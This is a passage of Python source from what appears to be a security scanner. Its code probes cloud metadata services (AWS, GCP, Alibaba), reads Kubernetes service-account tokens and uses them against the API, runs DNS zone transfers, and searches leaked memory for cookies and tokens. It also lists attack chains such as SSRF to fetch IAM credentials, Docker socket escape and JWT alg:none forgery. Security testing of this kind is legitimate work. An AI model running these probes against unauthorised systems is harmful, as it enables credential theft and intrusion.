    ):
        if marker in b and label not in hits:
            hits.append(label)
    return hits


def _metadata_probe(base, paths, headers=None, timeout=3.0):
    out = {"base": base, "probes": [], "reachable": False, "leaks": []}
    for p in paths:
        r = _metadata_fetch(base + p, headers=headers, timeout=timeout)
        entry = {"path": p, "status": r["status"], "bytes": r["bytes"],
                 "error": r["error"][:80] if r["error"] else ""}
        if r["status"] == 200 and r["bytes"] > 0:
            markers = _metadata_analyze(r["body"])
            entry["markers"] = markers
            out["reachable"] = True
            if markers:
                out["leaks"].append({"path": p, "markers": markers,
                                      "preview": safe_ascii(r["body"], 200)})
        out["probes"].append(entry)
    return out


def _stage10_aws_imdsv1(emit, setk, kb):
    emit_header(emit, "AWS IMDSv1 metadata probe")
    r = _metadata_probe(AWS_IMDS_BASE, AWS_IMDS_PATHS, timeout=3.0)
    setk("stage10.aws_imdsv1.reachable", r["reachable"])
    setk("stage10.aws_imdsv1.leaks", r["leaks"])
    setk("stage10.aws_imdsv1.probes", r["probes"])
    emit_kv(emit, "base", AWS_IMDS_BASE, VALUE)
    emit_kv(emit, "reachable", str(r["reachable"]),
             WARN if r["reachable"] else OK)
    for leak in r["leaks"][:4]:
        emit_kv(emit, leak["path"], ", ".join(leak["markers"]), DANGER)
    if r["reachable"] and r["leaks"]:
        emit_alert(emit, "exploit",
                   "AWS credentials/metadata readable via IMDSv1")
        count("vulns")
        count("exploits")
        setk("vulnerability.aws_imdsv1.detected", True)
    elif r["reachable"]:
        emit_alert(emit, "warn", "IMDSv1 reachable but no sensitive paths")
    else:
        emit_alert(emit, "ok", "IMDSv1 not reachable")


def _stage10_aws_imdsv2(emit, setk, kb):
    emit_header(emit, "AWS IMDSv2 token-based probe")
    if not _HAS_REQUESTS:
        emit_alert(emit, "warn", "requests unavailable")
        return
    token = None
    try:
        r = requests.put(AWS_IMDS_BASE + "/latest/api/token",
                          headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600",
                                    "User-Agent": "srx87/1.0"},
                          timeout=3.0, verify=False)
        if r.status_code == 200 and r.content:
            token = r.content.decode("ascii", "replace").strip()
    except Exception:
        pass
    setk("stage10.aws_imdsv2.token_received", token is not None)
    if not token:
        emit_kv(emit, "token", "not obtained", OK)
        emit_alert(emit, "ok", "IMDSv2 token endpoint not reachable")
        return
    setk("stage10.aws_imdsv2.token_len", len(token))
    emit_kv(emit, "token_len", str(len(token)), WARN)
    leaks = []
    for p in AWS_IMDS_PATHS:
        r = _metadata_fetch(AWS_IMDS_BASE + p,
                             headers={"X-aws-ec2-metadata-token": token},
                             timeout=3.0)
        if r["status"] == 200 and r["bytes"] > 0:
            markers = _metadata_analyze(r["body"])
            if markers:
                leaks.append({"path": p, "markers": markers,
                               "preview": safe_ascii(r["body"], 200)})
    setk("stage10.aws_imdsv2.leaks", leaks)
    emit_kv(emit, "leaks", str(len(leaks)), DANGER if leaks else OK)
    for leak in leaks[:4]:
        emit_kv(emit, leak["path"], ", ".join(leak["markers"]), DANGER)
    if leaks:
        emit_alert(emit, "exploit",
                   "IMDSv2 token obtained and metadata readable")
        count("vulns")
        count("exploits")
        setk("vulnerability.aws_imdsv2.detected", True)
    else:
        emit_alert(emit, "ok", "IMDSv2 token obtained but no sensitive paths")


def _stage10_gcp(emit, setk, kb):
    emit_header(emit, "GCP metadata server")
    r = _metadata_probe(GCP_METADATA_BASE, GCP_METADATA_PATHS,
                         headers={"Metadata-Flavor": "Google"}, timeout=3.0)
    setk("stage10.gcp.reachable", r["reachable"])
    setk("stage10.gcp.leaks", r["leaks"])
    emit_kv(emit, "reachable", str(r["reachable"]),
             WARN if r["reachable"] else OK)
    for leak in r["leaks"][:4]:
        emit_kv(emit, leak["path"], ", ".join(leak["markers"]), DANGER)
    if r["reachable"] and r["leaks"]:
        emit_alert(emit, "exploit", "GCP metadata leaked")
        count("vulns")
        count("exploits")
        setk("vulnerability.gcp_metadata.detected", True)
    else:
        emit_alert(emit, "ok", "GCP metadata not reachable")


def _stage10_alibaba(emit, setk, kb):
    emit_header(emit, "Alibaba Cloud metadata server")
    r = _metadata_probe(ALIBABA_IMDS_BASE, ALIBABA_IMDS_PATHS, timeout=3.0)
    setk("stage10.alibaba.reachable", r["reachable"])
    setk("stage10.alibaba.leaks", r["leaks"])
    emit_kv(emit, "reachable", str(r["reachable"]),
             WARN if r["reachable"] else OK)
    for leak in r["leaks"][:4]:
        emit_kv(emit, leak["path"], ", ".join(leak["markers"]), DANGER)
    if r["reachable"] and r["leaks"]:
        emit_alert(emit, "exploit", "Alibaba Cloud metadata leaked")
        count("vulns")
        count("exploits")
        setk("vulnerability.alibaba_metadata.detected", True)
    else:
        emit_alert(emit, "ok", "Alibaba Cloud metadata not reachable")


def _stage10_k8s(emit, setk, kb):
    emit_header(emit, "Kubernetes service account discovery")
    sa_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
    ca_path = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
    ns_path = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
    results = {}
    for label, path in (("token", sa_path), ("ca_cert", ca_path),
                         ("namespace", ns_path)):
        exists = os.path.exists(path)
        results[label] = exists
        emit_kv(emit, label, path if exists else "(not present)",
                 WARN if exists else MUTED)
    token = ""
    if results["token"]:
        try:
            with open(sa_path, "r", encoding="utf-8") as f:
                token = f.read().strip()
            setk("stage10.k8s.token_len", len(token))
            emit_kv(emit, "token_len", str(len(token)), WARN)
        except Exception:
            pass
    setk("stage10.k8s.token_present", bool(token))
    if not _HAS_REQUESTS or not token:
        emit_alert(emit, "info", "no k8s SA token — skipping API probe")
        return
    api_url = os.environ.get("KUBERNETES_SERVICE_HOST", "kubernetes.default.svc")
    port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
    try:
        r = requests.get("https://%s:%s/api/v1/namespaces" % (api_url, port),
                          headers={"Authorization": "Bearer " + token},
                          timeout=4.0, verify=False)
        setk("stage10.k8s.api_status", r.status_code)
        emit_kv(emit, "api_status", str(r.status_code),
                 DANGER if r.status_code == 200 else VALUE)
        if r.status_code == 200:
            emit_alert(emit, "exploit",
                       "Kubernetes API reachable with SA token")
            count("vulns")
            count("exploits")
            setk("vulnerability.k8s_api.detected", True)
    except Exception as e:
        emit_kv(emit, "api_error", str(e)[:80], MUTED)
    if not results["token"]:
        emit_alert(emit, "ok", "not running in a Kubernetes pod")


def _stage10_docker(emit, setk, kb):
    emit_header(emit, "Docker socket + TCP 2375/2376 discovery")
    sockets = ["/var/run/docker.sock", "/run/docker.sock"]
    present = [p for p in sockets if os.path.exists(p)]
    for p in sockets:
        emit_kv(emit, "socket", p if p in present else p + " (absent)",
                 WARN if p in present else MUTED)
    setk("stage10.docker.sockets_present", present)
    tcp_hits = []
    for host in ("127.0.0.1", "localhost"):
        for port in (2375, 2376):
            s, _, _ = connect_tcp(host, port, timeout=1.5)
            if s is not None:
                tcp_hits.append({"host": host, "port": port})
                emit_kv(emit, "tcp", "%s:%d open" % (host, port), WARN)
                try:
                    s.close()
                except Exception:
                    pass
            else:
                emit_kv(emit, "tcp", "%s:%d closed" % (host, port), MUTED)
    setk("stage10.docker.tcp_open", tcp_hits)
    if present or tcp_hits:
        emit_alert(emit, "vuln", "Docker daemon reachable locally")
        count("vulns")
        setk("vulnerability.docker_socket.detected", True)
    else:
        emit_alert(emit, "ok", "no local docker daemon reachable")


def _stage10_container(emit, setk, kb):
    emit_header(emit, "container capabilities enumeration")
    indicators = {}
    if os.path.exists("/.dockerenv"):
        indicators["dockerenv"] = True
    if os.path.exists("/run/.containerenv"):
        indicators["containerenv"] = True
    try:
        with open("/proc/self/status", "r", encoding="utf-8") as f:
            for line in f.read().splitlines():
                if line.startswith("CapEff:"):
                    indicators["cap_eff"] = line.split(":", 1)[1].strip()
                    break
    except Exception:
        pass
    setk("stage10.container.indicators", indicators)
    for k, v in indicators.items():
        emit_kv(emit, k, str(v), WARN if v else MUTED)
    cap_eff = indicators.get("cap_eff", "")
    if cap_eff.endswith("ffffffffff") or cap_eff == "000001ffffffffff":
        emit_alert(emit, "vuln", "container runs with full capabilities")
        count("vulns")
        setk("vulnerability.container_escape.detected", True)
    elif indicators:
        emit_alert(emit, "info", "container environment detected")
    else:
        emit_alert(emit, "ok", "not running inside a detected container")


def _stage10_ipv6(emit, setk, kb):
    target = _current_target()
    emit_header(emit, "IPv6 enumeration + reachability")
    aaaa = resolve_aaaa(target.host)
    setk("stage10.ipv6.aaaa_records", aaaa)
    emit_kv(emit, "aaaa_count", str(len(aaaa)), BRAND)
    if not aaaa:
        emit_alert(emit, "ok", "no AAAA records")
        return
    reachable = []
    for a in aaaa[:3]:
        try:
            s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            s.settimeout(3.0)
            s.connect((a, target.port, 0, 0))
            reachable.append(a)
            count("connections")
            s.close()
        except Exception:
            pass
    setk("stage10.ipv6.reachable", reachable)
    emit_kv(emit, "reachable_on_port", "%d/%d" % (len(reachable), len(aaaa[:3])),
             WARN if reachable else MUTED)


def _stage10_zone_transfer(emit, setk, kb):
    target = _current_target()
    parts = target.host.split(".")
    apex = ".".join(parts[-2:]) if len(parts) >= 2 else target.host
    emit_header(emit, "AXFR zone transfer attempt on %s" % apex)
    if not _HAS_DNS:
        emit_alert(emit, "warn", "dnspython unavailable")
        return
    try:
        ns_ans = dns.resolver.resolve(apex, "NS")
        ns_servers = [str(a).rstrip(".") for a in ns_ans]
    except Exception:
        emit_alert(emit, "info", "no NS servers resolved")
        setk("stage10.zone_transfer.ns_servers", [])
        return
    setk("stage10.zone_transfer.ns_servers", ns_servers)
    emit_kv(emit, "apex", apex, BRAND)
    emit_kv(emit, "ns_count", str(len(ns_servers)), VALUE)
    for ns in ns_servers[:4]:
        emit_kv(emit, "ns", ns, VALUE)
    successful = []
    for ns in ns_servers:
        try:
            z = dns.zone.from_xfr(dns.query.xfr(ns, apex, timeout=5.0))
            successful.append({"ns": ns, "records": len(list(z.nodes.keys()))})
            emit_kv(emit, ns, "success (%d records)" % successful[-1]["records"],
                     DANGER)
        except Exception:
            emit_kv(emit, ns, "refused", MUTED)
    setk("stage10.zone_transfer.attempts", successful)
    if successful:
        emit_alert(emit, "exploit",
                   "AXFR zone transfer succeeded — full zone leaked")
        count("vulns")
        count("exploits")
        setk("vulnerability.zone_transfer.detected", True)
    else:
        emit_alert(emit, "ok", "AXFR refused by all nameservers")


def _stage10_dnssec(emit, setk, kb):
    target = _current_target()
    parts = target.host.split(".")
    apex = ".".join(parts[-2:]) if len(parts) >= 2 else target.host
    emit_header(emit, "DNSSEC check (DNSKEY / DS / RRSIG) for %s" % apex)
    if not _HAS_DNS:
        emit_alert(emit, "warn", "dnspython unavailable")
        return
    dnskey_count = ds_count = rrsig = 0
    try:
        dnskey_count = len(list(dns.resolver.resolve(apex, "DNSKEY")))
    except Exception:
        pass
    try:
        ds_count = len(list(dns.resolver.resolve(apex, "DS")))
    except Exception:
        pass
    try:
        ans = dns.resolver.resolve(apex, "A", want_dnssec=True)
        for rrset in ans.response.answer:
            for rr in rrset:
                if rr.rdtype == dns.rdatatype.RRSIG:
                    rrsig += 1
    except Exception:
        pass
    setk("stage10.dnssec.dnskey_count", dnskey_count)
    setk("stage10.dnssec.ds_count", ds_count)
    setk("stage10.dnssec.rrsig_count", rrsig)
    emit_kv(emit, "apex", apex, BRAND)
    emit_kv(emit, "dnskey_records", str(dnskey_count),
             OK if dnskey_count else WARN)
    emit_kv(emit, "ds_records", str(ds_count), OK if ds_count else WARN)
    emit_kv(emit, "rrsig_present", str(rrsig > 0), OK if rrsig else WARN)
    if dnskey_count and ds_count:
        emit_alert(emit, "ok", "DNSSEC configured with DS chain")
    elif dnskey_count or ds_count:
        emit_alert(emit, "warn", "partial DNSSEC configuration")
    else:
        emit_alert(emit, "info", "DNSSEC not configured")


register_stage(StageSpec(10, "stage_10_cloud_supply",
    "Cloud / Supply Chain / Infrastructure",
    "Probes cloud metadata services for AWS (IMDSv1 + IMDSv2 with real token PUT), GCP, "
    "Alibaba. Enumerates Kubernetes service account tokens and API. Detects Docker socket "
    "and TCP 2375/2376. Enumerates container capabilities. AXFR zone transfer. DNSSEC "
    "presence. IPv6 reachability.",
    [
        TestSpec("cloud.aws_imdsv1", "AWS IMDSv1 metadata",
                 _stage10_aws_imdsv1, 60.0),
        TestSpec("cloud.aws_imdsv2", "AWS IMDSv2 token",
                 _stage10_aws_imdsv2, 60.0),
        TestSpec("cloud.gcp_metadata", "GCP metadata", _stage10_gcp, 45.0),
        TestSpec("cloud.alibaba", "Alibaba Cloud metadata",
                 _stage10_alibaba, 30.0),
        TestSpec("cloud.k8s_api", "Kubernetes SA + API", _stage10_k8s, 25.0),
        TestSpec("cloud.docker_socket", "Docker socket discovery",
                 _stage10_docker, 20.0),
        TestSpec("cloud.container_escape", "container capabilities",
                 _stage10_container, 15.0),
        TestSpec("net.ipv6_scan", "IPv6 reachability", _stage10_ipv6, 20.0),
        TestSpec("dns.zone_transfer", "AXFR zone transfer",
                 _stage10_zone_transfer, 30.0),
        TestSpec("dns.dnssec_check", "DNSSEC presence", _stage10_dnssec, 20.0),
    ], 600.0))


CVE_DATABASE = [
    {"id": "CVE-2014-0160", "name": "Heartbleed", "severity": "HIGH", "cvss": 7.5,
     "detect_kb_keys": ["vulnerability.heartbleed.detected",
                        "vulnerability.heartbleed.extension_present",
                        "stage04.heartbleed.extension_advertised"],
     "fixed_in": "OpenSSL 1.0.1g",
     "description": "TLS heartbeat extension out-of-bounds read leaks server memory."},
    {"id": "CVE-2016-0800", "name": "DROWN", "severity": "HIGH", "cvss": 7.4,
     "detect_kb_keys": ["vulnerability.drown.detected",
                        "stage04.drown.ssl2_accepted"],
     "fixed_in": "Disable SSLv2",
     "description": "SSLv2 cross-protocol attack decrypts TLS 1.x if RSA key shared."},
    {"id": "CVE-2014-3566", "name": "POODLE", "severity": "HIGH", "cvss": 7.4,
     "detect_kb_keys": ["vulnerability.poodle.detected",
                        "stage04.poodle.ssl3_accepted",
                        "stage03.cipher.ssl3.accepted"],
     "fixed_in": "Disable SSLv3",
     "description": "SSLv3 CBC padding oracle allows plaintext recovery."},
    {"id": "CVE-2015-4000", "name": "Logjam", "severity": "MEDIUM", "cvss": 5.9,
     "detect_kb_keys": ["vulnerability.logjam.detected",
                        "vulnerability.dh_param.detected",
                        "stage04.dh_param.p_bits"],
     "fixed_in": "Use 2048-bit DH parameters",
     "description": "Weak DH parameters allow downgrade to 512-bit export DH."},
    {"id": "CVE-2015-0204", "name": "FREAK", "severity": "MEDIUM", "cvss": 5.9,
     "detect_kb_keys": ["vulnerability.freak.detected",
                        "stage04.freak.export_accepted"],
     "fixed_in": "Disable export-grade RSA",
     "description": "Export RSA downgrade attack on TLS handshake."},
    {"id": "CVE-2017-15361", "name": "ROCA", "severity": "HIGH", "cvss": 7.5,
     "detect_kb_keys": ["stage02.roca.hits"],
     "fixed_in": "Regenerate keys outside Infineon library",
     "description": "Infineon RSA key generation bug allows efficient factorization."},
    {"id": "CVE-2016-2107", "name": "OpenSSL AES-NI CBC padding oracle",
     "severity": "MEDIUM", "cvss": 5.9,
     "detect_kb_keys": ["stage04.lucky13.signal", "stage04.lucky13.significant"],
     "fixed_in": "OpenSSL 1.0.2h / 1.0.1t",
     "description": "AES-NI CBC MAC check timing leaks padding validity."},
    {"id": "CVE-2016-9244", "name": "F5 Ticketbleed", "severity": "HIGH", "cvss": 7.5,
     "detect_kb_keys": ["vulnerability.f5_ticketbleed.detected"],
     "fixed_in": "F5 BIG-IP 11.6.1",
     "description": "F5 TLS session ticket leaks 31 bytes of server memory."},
    {"id": "CVE-2022-21449", "name": "Java ECDSA psychic signatures",
     "severity": "HIGH", "cvss": 7.5,
     "detect_kb_keys": ["vulnerability.ecdsa_psychic.detected"],
     "fixed_in": "Oracle Java 15.0.2 / 11.0.11 / 8u301",
     "description": "Java ECDSA accepts all-zero r,s signatures."},
    {"id": "CVE-2022-31813", "name": "Apache mod_proxy XFF bypass",
     "severity": "HIGH", "cvss": 9.8,
     "detect_kb_keys": ["vulnerability.apache_xff.detected",
                        "stage07.ip_forwarded_chain.results"],
     "fixed_in": "Apache HTTPD 2.4.54",
     "description": "mod_proxy drops X-Forwarded-For headers — auth bypass."},
    {"id": "CVE-2023-44487", "name": "HTTP/2 Rapid Reset",
     "severity": "HIGH", "cvss": 7.5,
     "detect_kb_keys": ["vulnerability.rapid_reset.protected",
                        "stage05.h2.rapid_reset.server_goaway",
                        "stage05.h2.alpn.negotiated"],
     "fixed_in": "Vendor-specific patch",
     "description": "HTTP/2 stream reset flood causes DoS."},
    {"id": "CVE-2024-27316", "name": "HTTP/2 CONTINUATION flood",
     "severity": "HIGH", "cvss": 7.5,
     "detect_kb_keys": ["vulnerability.continuation_flood.surface",
                        "stage05.h2.continuation.goaway"],
     "fixed_in": "Vendor-specific patch",
     "description": "END_HEADERS-less CONTINUATION frames cause server OOM."},
    {"id": "CVE-2019-1559", "name": "OpenSSL 0-byte padding oracle",
     "severity": "MEDIUM", "cvss": 5.9,
     "detect_kb_keys": ["vulnerability.bleichenbacher.detected",
                        "stage04.bleichenbacher.distinct"],
     "fixed_in": "OpenSSL 1.1.0j / 1.0.2r",
     "description": "Padding oracle distinguishes 0-byte vs non-0-byte padding."},
    {"id": "CVE-2020-1968", "name": "Raccoon attack",
     "severity": "MEDIUM", "cvss": 5.9,
     "detect_kb_keys": ["vulnerability.raccoon.surface",
                        "vulnerability.dh_param.detected"],
     "fixed_in": "Use TLS 1.3 or safe DH primes",
     "description": "DH timing side channel leaks shared secret."},
    {"id": "CVE-2012-5081", "name": "Manger attack",
     "severity": "MEDIUM", "cvss": 5.9,
     "detect_kb_keys": ["vulnerability.manger.surface"],
     "fixed_in": "Use RSA-OAEP or ECDHE",
     "description": "RSA-OAEP CCA on TLS."},
]


def _stage11_correlate_cve(cve, kb):
    out = {"cve": cve["id"], "name": cve["name"], "severity": cve["severity"],
           "cvss": cve["cvss"], "matched_keys": [], "matched": False}
    for k in cve["detect_kb_keys"]:
        v = kb.get(k)
        if v is True:
            out["matched_keys"].append({"key": k, "value": "True"})
        elif isinstance(v, (list, dict)) and v:
            out["matched_keys"].append({"key": k, "value": "non-empty"})
        elif isinstance(v, (int, float)) and v:
            out["matched_keys"].append({"key": k, "value": v})
        elif isinstance(v, str) and v:
            out["matched_keys"].append({"key": k, "value": v[:80]})
    out["matched"] = len(out["matched_keys"]) > 0
    return out


def _stage11_is_high_entropy(data, threshold=5.5):
    if len(data) < 4:
        return False
    if len(set(data)) < 8:
        return False
    return entropy_shannon(data) >= threshold


def _stage11_heap_search(leaked):
    out = {"total_bytes": len(leaked), "candidates_48": 0, "candidates_32": 0,
           "candidates_16": 0, "session_key_candidates": [], "cookie_like": [],
           "auth_like": []}
    if not leaked:
        return out
    for i in range(0, max(0, len(leaked) - 48), 4):
        w = leaked[i:i + 48]
        if len(w) == 48 and _stage11_is_high_entropy(w):
            out["candidates_48"] += 1
            if len(out["session_key_candidates"]) < 8:
                out["session_key_candidates"].append({
                    "offset": i,
                    "entropy": round(entropy_shannon(w), 3),
                    "preview_hex": w[:16].hex(),
                })
    for i in range(0, max(0, len(leaked) - 32), 4):
        w = leaked[i:i + 32]
        if len(w) == 32 and _stage11_is_high_entropy(w):
            out["candidates_32"] += 1
    for i in range(0, max(0, len(leaked) - 16), 4):
        w = leaked[i:i + 16]
        if len(w) == 16 and _stage11_is_high_entropy(w):
            out["candidates_16"] += 1
    for m in re.finditer(rb"[A-Za-z0-9_\-]{20,64}", leaked):
        tok = m.group(0)
        if b"eyJ" in tok and len(out["auth_like"]) < 6:
            out["auth_like"].append(tok[:48].decode("ascii", "replace"))
    for m in re.finditer(rb"(Cookie|Set-Cookie|Authorization|X-Api-Key|api_key)[:=]\s*([^\r\n;]{8,128})",
                          leaked, re.IGNORECASE):
        if len(out["cookie_like"]) < 8:
            out["cookie_like"].append(m.group(2)[:64].decode("ascii", "replace"))
    return out


def _stage11_build_attack_chain(kb):
    chains = []

    def g(k):
        v = kb.get(k)
        return v if v else None

    if g("vulnerability.heartbleed.detected") or g("stage04.heartbleed.extension_advertised"):
        chains.append({
            "name": "Heartbleed memory exfiltration",
            "steps": ["send heartbeat with large claimed payload",
                       "parse leaked heartbeat response",
                       "search leaked memory for cookies/keys/tokens",
                       "replay harvested credentials against target"],
            "severity": "HIGH", "cvss": 9.8,
        })
    if g("vulnerability.robot.detected") or g("stage04.robot.oracle_detected"):
        chains.append({
            "name": "ROBOT Bleichenbacher CCA",
            "steps": ["capture RSA handshake",
                       "replay crafted PKCS#1v1.5 ciphertexts",
                       "use padding oracle to recover premaster secret",
                       "decrypt captured session"],
            "severity": "HIGH", "cvss": 7.5,
        })
    if g("vulnerability.poodle.detected"):
        chains.append({
            "name": "POODLE SSLv3 padding oracle",
            "steps": ["force SSLv3 via version downgrade",
                       "send CBC-boundary-aligned requests",
                       "recover cookie bytes via padding oracle"],
            "severity": "HIGH", "cvss": 7.4,
        })
    if g("vulnerability.drown.detected"):
        chains.append({
            "name": "DROWN cross-protocol",
            "steps": ["establish SSLv2 session on any port",
                       "recover premaster via Bleichenbacher on captured TLS traffic",
                       "decrypt victim TLS session if RSA key shared"],
            "severity": "HIGH", "cvss": 7.4,
        })
    if g("vulnerability.rsa_factoring.detected") or g("stage04.fermat_batch.fermat_hits"):
        chains.append({
            "name": "RSA factoring to key recovery",
            "steps": ["extract RSA moduli from chain",
                       "factor via Fermat / batch-GCD / ROCA",
                       "reconstruct private key",
                       "decrypt captured sessions or forge signatures"],
            "severity": "CRITICAL", "cvss": 9.1,
        })
    if g("vulnerability.smuggle_clte.detected") or g("vulnerability.smuggle_tecl.surface"):
        chains.append({
            "name": "HTTP request smuggling",
            "steps": ["identify CL.TE / TE.CL desync",
                       "smuggle prefix request to backend",
                       "poison cache or hijack next user's request"],
            "severity": "HIGH", "cvss": 8.1,
        })
    if g("vulnerability.ssrf_cloud.detected") or g("stage09.ssrf_cloud.metadata_leaks"):
        chains.append({
            "name": "SSRF to cloud metadata",
            "steps": ["inject SSRF payload into URL param",
                       "fetch 169.254.169.254/latest/meta-data/iam/security-credentials/",
                       "obtain AWS temporary credentials",
                       "escalate to cloud API access"],
            "severity": "CRITICAL", "cvss": 9.8,
        })
    if g("vulnerability.zone_transfer.detected"):
        chains.append({
            "name": "DNS zone transfer",
            "steps": ["query NS records for apex",
                       "attempt AXFR against each nameserver",
                       "enumerate all subdomains from zone",
                       "identify additional attack surface"],
            "severity": "MEDIUM", "cvss": 5.3,
        })
    if g("vulnerability.docker_socket.detected"):
        chains.append({
            "name": "Docker socket escape",
            "steps": ["access /var/run/docker.sock",
                       "list running containers",
                       "exec into privileged container",
                       "mount host filesystem"],
            "severity": "CRITICAL", "cvss": 9.8,
        })
    if g("vulnerability.acl_header_auth_bypass.detected"):
        chains.append({
            "name": "Header-based authentication bypass",
            "steps": ["inject X-Forwarded-User / X-Remote-User / X-Original-URL",
                       "reach admin endpoint as privileged user",
                       "perform privileged action"],
            "severity": "CRITICAL", "cvss": 9.1,
        })
    if g("vulnerability.jwt_alg_none.detected"):
        chains.append({
            "name": "JWT alg:none bypass",
            "steps": ["forge JWT with alg:none and admin claims",
                       "send as Authorization: Bearer",
                       "obtain admin session"],
            "severity": "CRITICAL", "cvss": 9.1,
        })
    return {"chains": chains, "count": len(chains)}


def _stage11_cve_heartbleed(emit, setk, kb):
    emit_header(emit, "CVE-2014-0160 Heartbleed correlation")
    cve = CVE_DATABASE[0]
    r = _stage11_correlate_cve(cve, kb)
    setk("stage11.cve.2014_0160", r)
    emit_kv(emit, "cve", cve["id"] + " " + cve["name"], BRAND)
    emit_kv(emit, "severity", "%s %.1f" % (cve["severity"], cve["cvss"]),
             DANGER if r["matched"] else MUTED)
    emit_kv(emit, "matched", str(r["matched"]), DANGER if r["matched"] else OK)
    for mk in r["matched_keys"]:
        emit_kv(emit, "signal", mk["key"], WARN)
    if r["matched"]:
        count("vulns")
        emit_alert(emit, "vuln", "CVE-2014-0160 precondition met")


def _stage11_cve_drown(emit, setk, kb):
    emit_header(emit, "CVE-2016-0800 DROWN correlation")
    cve = CVE_DATABASE[1]
    r = _stage11_correlate_cve(cve, kb)
    setk("stage11.cve.2016_0800", r)
    emit_kv(emit, "cve", cve["id"] + " " + cve["name"], BRAND)
    emit_kv(emit, "matched", str(r["matched"]), DANGER if r["matched"] else OK)
    if r["matched"]:
        count("vulns")
        emit_alert(emit, "vuln", "CVE-2016-0800 precondition met")


def _stage11_cve_poodle(emit, setk, kb):
    emit_header(emit, "CVE-2014-3566 POODLE correlation")
    cve = CVE_DATABASE[2]
    r = _stage11_correlate_cve(cve, kb)
    setk("stage11.cve.2014_3566", r)
    emit_kv(emit, "cve", cve["id"] + " " + cve["name"], BRAND)
    emit_kv(emit, "matched", str(r["matched"]), DANGER if r["matched"] else OK)
    if r["matched"]:
        count("vulns")
        emit_alert(emit, "vuln", "CVE-2014-3566 precondition met")


def _stage11_cve_logjam(emit, setk, kb):
    emit_header(emit, "CVE-2015-4000 Logjam correlation")
    cve = CVE_DATABASE[3]
    r = _stage11_correlate_cve(cve, kb)
    setk("stage11.cve.2015_4000", r)
    emit_kv(emit, "cve", cve["id"] + " " + cve["name"], BRAND)
    emit_kv(emit, "matched", str(r["matched"]), DANGER if r["matched"] else OK)


def _stage11_cve_freak(emit, setk, kb):
    emit_header(emit, "CVE-2015-0204 FREAK correlation")
    cve = CVE_DATABASE[4]
    r = _stage11_correlate_cve(cve, kb)
    setk("stage11.cve.2015_0204", r)
    emit_kv(emit, "cve", cve["id"] + " " + cve["name"], BRAND)
    emit_kv(emit, "matched", str(r["matched"]), DANGER if r["matched"] else OK)


def _stage11_cve_roca(emit, setk, kb):
    emit_header(emit, "CVE-2017-15361 ROCA correlation")
    cve = CVE_DATABASE[5]
    r = _stage11_correlate_cve(cve, kb)
    setk("stage11.cve.2017_15361", r)
    emit_kv(emit, "cve", cve["id"] + " " + cve["name"], BRAND)
    emit_kv(emit, "matched", str(r["matched"]), DANGER if r["matched"] else OK)


def _stage11_cve_openssl_cbc(emit, setk, kb):
    emit_header(emit, "CVE-2016-2107 AES-NI CBC oracle correlation")
    cve = CVE_DATABASE[6]
    r = _stage11_correlate_cve(cve, kb)
    setk("stage11.cve.2016_2107", r)
    emit_kv(emit, "cve", cve["id"] + " " + cve["name"], BRAND)
    emit_kv(emit, "matched", str(r["matched"]), WARN if r["matched"] else OK)


def _stage11_cve_ticketbleed(emit, setk, kb):
    emit_header(emit, "CVE-2016-9244 F5 Ticketbleed correlation")
    cve = CVE_DATABASE[7]
    r = _stage11_correlate_cve(cve, kb)
    setk("stage11.cve.2016_9244", r)
    emit_kv(emit, "cve", cve["id"] + " " + cve["name"], BRAND)
    emit_kv(emit, "matched", str(r["matched"]), DANGER if r["matched"] else OK)


def _stage11_cve_java_ecdsa(emit, setk, kb):
    emit_header(emit, "CVE-2022-21449 Java ECDSA psychic signatures")
    cve = CVE_DATABASE[8]
    r = _stage11_correlate_cve(cve, kb)
    setk("stage11.cve.2022_21449", r)
    emit_kv(emit, "cve", cve["id"] + " " + cve["name"], BRAND)
    emit_kv(emit, "matched", str(r["matched"]), DANGER if r["matched"] else OK)


def _stage11_cve_apache_xff(emit, setk, kb):
    emit_header(emit, "CVE-2022-31813 Apache mod_proxy XFF bypass")
    cve = CVE_DATABASE[9]
    r = _stage11_correlate_cve(cve, kb)
    setk("stage11.cve.2022_31813", r)
    emit_kv(emit, "cve", cve["id"] + " " + cve["name"], BRAND)
    emit_kv(emit, "matched", str(r["matched"]), DANGER if r["matched"] else OK)


def _stage11_cve_rapid_reset(emit, setk, kb):
    emit_header(emit, "CVE-2023-44487 HTTP/2 Rapid Reset correlation")
    cve = CVE_DATABASE[10]
    r = _stage11_correlate_cve(cve, kb)
    setk("stage11.cve.2023_44487", r)
    emit_kv(emit, "cve", cve["id"] + " " + cve["name"], BRAND)
    h2 = kb.get("stage05.h2.alpn.negotiated")
    goaway = kb.get("stage05.h2.rapid_reset.server_goaway")
    emit_kv(emit, "h2_negotiated", str(bool(h2)), OK if h2 else MUTED)
    emit_kv(emit, "server_goaway", str(goaway or 0), OK if goaway else WARN)
    if not h2:
        emit_alert(emit, "ok", "HTTP/2 not negotiated — not applicable")
    elif goaway:
        emit_alert(emit, "ok", "server enforces reset-flood protection")
    else:
        emit_alert(emit, "warn",
                   "HTTP/2 without reset-flood protection")
        setk("vulnerability.cve_2023_44487.surface", True)


def _stage11_cve_continuation(emit, setk, kb):
    emit_header(emit, "CVE-2024-27316 HTTP/2 CONTINUATION flood")
    cve = CVE_DATABASE[11]
    r = _stage11_correlate_cve(cve, kb)
    setk("stage11.cve.2024_27316", r)
    emit_kv(emit, "cve", cve["id"] + " " + cve["name"], BRAND)
    surface = kb.get("stage05.h2.continuation.surface")
    emit_kv(emit, "continuation_surface", str(bool(surface)),
             WARN if surface else OK)
    if surface:
        emit_alert(emit, "warn", "CONTINUATION flood surface detected")
        setk("vulnerability.cve_2024_27316.surface", True)


def _stage11_cve_0byte(emit, setk, kb):
    emit_header(emit, "CVE-2019-1559 OpenSSL 0-byte padding oracle")
    cve = CVE_DATABASE[12]
    r = _stage11_correlate_cve(cve, kb)
    setk("stage11.cve.2019_1559", r)
    emit_kv(emit, "cve", cve["id"] + " " + cve["name"], BRAND)
    emit_kv(emit, "matched", str(r["matched"]), WARN if r["matched"] else OK)


def _stage11_cve_raccoon(emit, setk, kb):
    emit_header(emit, "CVE-2020-1968 Raccoon attack correlation")
    cve = CVE_DATABASE[13]
    r = _stage11_correlate_cve(cve, kb)
    setk("stage11.cve.2020_1968", r)
